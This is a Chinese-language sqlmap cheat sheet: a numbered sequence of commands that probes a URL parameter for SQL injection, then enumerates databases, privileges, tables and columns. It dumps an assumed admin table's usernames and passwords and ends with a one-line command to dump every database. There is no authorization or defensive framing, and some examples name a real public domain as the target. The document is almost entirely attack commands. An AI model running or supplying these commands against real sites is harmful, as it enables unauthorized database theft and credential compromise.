#### Sqlmap常用命令

1.  **sqlmap.py -u "http://www.XXX.com/index.asp?id=1"**   

    判断id参数是否存在注入：结果中包含 “id” is Vulnerable  字段表示存在注入

    存在注入，下面的步骤才可以执行成功~

2.  sqlmap.py -u "http://www.XXX.com/index.asp?id=1"  --dbs

    列举能列出的所有数据库名

3.  sqlmap.py -u "http://www.XXX.com/index.asp?id=1" --current-db

    列出当前使用的数据库名，假设列出“sqltest”数据库

4.  sqlmap.py -u "http://www.XXX.com/index.asp?id=1"  --is-dba

    判断该注入点是否有管理员权限：返回true  表示是管理员

5.  sqlmap.py -u "http://www.XXX.com/index.asp?id=1" -D "sqltest" --tables

    获取sqltest中的所有表，假设有"admin"表

6.  sqlmap.py -u "http://www.XXX.com/index.asp?id=1" -D "sqltest" -T "admin" --columns

    列举表admin的字段（列名），假设存在"username","password"字段

7.  sqlmap.py -u "http://www.XXX.com/index.asp?id=1" -D "sqltest" -T "admin" -C "username,password" --dump

    下载字段username，password的值，若询问是否破解md5加密，选择no即可

--help，可以查看所有参数，格式：python2 sqlmap.py -u http://www.xxx.com/index.asp?id=1 --[参数] --[参数]

常用参数如下：

| 参数                                     | 含义                                                         | 示例                                                         |
| ---------------------------------------- | ------------------------------------------------------------ | :----------------------------------------------------------- |
| --batch                                  | 跳过手工确认，直接跑码                                       | python sqlmap.py -u url --batch                              |
| -v                                       | 输出等级，0-6共7级，默认1级                                  | -v 3                                                         |
| --level                                  | 默认等级是1，cookie测试为2，use-agent或refer测试为3，host测试为5 | **sqlmap**.py -u "www.baidu.com/user.php?id=7" --level 3     |
| -u                                       | 指定目标，指定一个URL作为目标，还可以指定端口                | **sqlmap**.py -u "www.baidu.com/user.php?id=7"<br>**sqlmap**.py -url "www.baidu.com:8080/user.php?id=7" |
| --dbs                                    | 列出所有数据库名                                             | sqlmap.py -u "http://127.0.0.1/sqlinject.php?id=1" --dbs     |
| --current-db                             | 列出当前应用程序使用的的数据库                               | sqlmap.py -u "http://127.0.0.1/sqlinject.php?id=1" --current-db |
| --is-dba                                 | 判断注入点是否有管理员权限                                   | sqlmap.py -u "http://127.0.0.1/sqlinject.php?id=1" --is-dba  |
| -D 数据库名 --tables                     | 列出数据库的表名                                             | sqlmap.py -u "http://127.0.0.1/sqlinject.php?id=1" -D "security" --tables |
| -D 数据库名 -T 表名 --columns            | 列出字段名                                                   | sqlmap.py -u "http://127.0.0.1/sqlinject.php?id=1" -D "test" -T "test" --columns |
| -D 数据库名 -T 表名 -C "id,name"　--dump | 列出字段值                                                   | sqlmap.py -u "http://127.0.0.1/sqlinject.php?id=1" -D "test" -T "test" -C "id,name"　--dump |
| -r                                       | 本地seesion文本                                              |                                                              |

**一句话脱库：sqlmap.py -u "http://127.0.0.1/sqlinject.php?id=1" -D "数据库名" --dump-all**

